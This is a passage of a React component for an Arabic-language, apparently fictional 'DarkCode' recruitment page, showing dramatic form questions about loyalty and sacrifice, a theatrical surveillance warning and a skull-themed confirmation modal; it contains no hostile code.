                                            <option value="yes">نعم، كثيراً</option>
                                            <option value="rarely">نادراً</option>
                                            <option value="no">لا (أنا لا أهذي)</option>
                                            <option value="ignored">أتجاهلها</option>
                                        </select>
                                        <ChevronDown className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none" size={16} />
                                    </div>
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>صف كابوساً يتكرر عليك أو حلماً غريباً لا تنساه</label>
                                    <textarea name="nightmare" rows={2} onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>ما هي المهارة الوحيدة التي تتقنها وتجعلنا نختارك أنت؟</label>
                                    <input name="skill" type="text" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>لماذا يجب أن نثق بك؟ (أقنعنا في جملة واحدة)</label>
                                    <input name="loyalty" type="text" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} />
                                </div>
                                <div>
                                    <label className={`${labelClasses} text-white`}>ما هو الشيء الذي أنت مستعد للتضحية به من أجل الوصول للحقيقة؟</label>
                                    <input name="sacrifice" type="text" onChange={handleChange} onFocus={handleFocus} className={`${inputClasses} border-red-900 focus:border-red-500`} placeholder="كل شيء / لا شيء..." />
                                </div>
                            </div>
                        </div>

                        {/* Footer Warning & Submit */}
                        <div className="flex flex-col gap-6 items-center border-t border-white/10 pt-8">
                            <div className="text-gray-400 text-xs text-center max-w-2xl font-mono">
                                <FileWarning className="inline-block mb-1 text-red-500" />
                                <br />
                                بضغطك على زر الإرسال، أنت تقر بأن جميع البيانات أعلاه صحيحة، وتوافق على خضوعك للمراقبة الإلكترونية الدائمة، وتسليم ملكية بياناتك الرقمية للمنظمة. لا يوجد طريق للعودة.
                            </div>

                            <button
                                type="submit"
                                onMouseEnter={() => audioService.play('hover')}
                                className="group relative w-full md:w-2/3 h-16 flex items-center justify-center text-xl font-black text-black transition-all duration-300 bg-gradient-to-r from-neon-blue to-blue-600 hover:from-white hover:to-gray-200 font-cairo shadow-[0_0_40px_rgba(0,217,255,0.4)] clip-path-polygon"
                                style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}
                            >
                                <span className="flex items-center gap-3 uppercase tracking-wider">
                                    إرسال الملف الأمني وتأكيد الولاء
                                    <Send size={24} />
                                </span>
                            </button>
                        </div>
                    </form>
                )}

                {/* CONFIRMATION MODAL */}
                {showConfirmation && (
                    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/95 backdrop-blur-sm p-4 animate-fade-in-up">
                        <div className="bg-black border-2 border-red-600 shadow-[0_0_50px_rgba(220,38,38,0.5)] p-8 max-w-md w-full text-center relative overflow-hidden">
                            <div className="absolute top-0 left-0 w-full h-1 bg-red-600 animate-pulse"></div>
                            <Skull className="w-16 h-16 text-red-600 mx-auto mb-4 animate-pulse" />
                            <h2 className="text-3xl font-black text-white mb-2 uppercase">تأكيد نهائي</h2>
                            <p className="text-red-500 font-mono text-sm mb-6 border-y border-red-900 py-2">
                                بمجرد الإرسال، ستصبح بياناتك ملكاً لـ DarkCode. حياتك القديمة ستنتهي. هل أنت متأكد تماماً من هذا القرار؟
                            </p>

                            <div className="flex flex-col gap-3">
                                <button
                                    onClick={handleFinalSubmit}
                                    disabled={isSubmitting}
                                    className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-sm transition-colors flex items-center justify-center gap-2"
                                >
                                    {isSubmitting ? (
                                        <span className="animate-pulse">جاري نقل ملكية الروح...</span>
                                    ) : (
                                        <>
                                            <BadgeAlert size={18} />
                                            نعم، أنا أتحمل العواقب
                                        </>
                                    )}
                                </button>
                                <button
                                    onClick={() => setShowConfirmation(false)}
                                    disabled={isSubmitting}
                                    className="w-full bg-transparent border border-gray-600 text-gray-400 hover:text-white hover:border-white py-2 px-4 rounded-sm transition-colors"
                                >
                                    تراجع (ما زلت متردداً)
                                </button>
                            </div>
                        </div>
                    </div>
                )}
            </div>
        </div >
    );
};

export default IntroSection;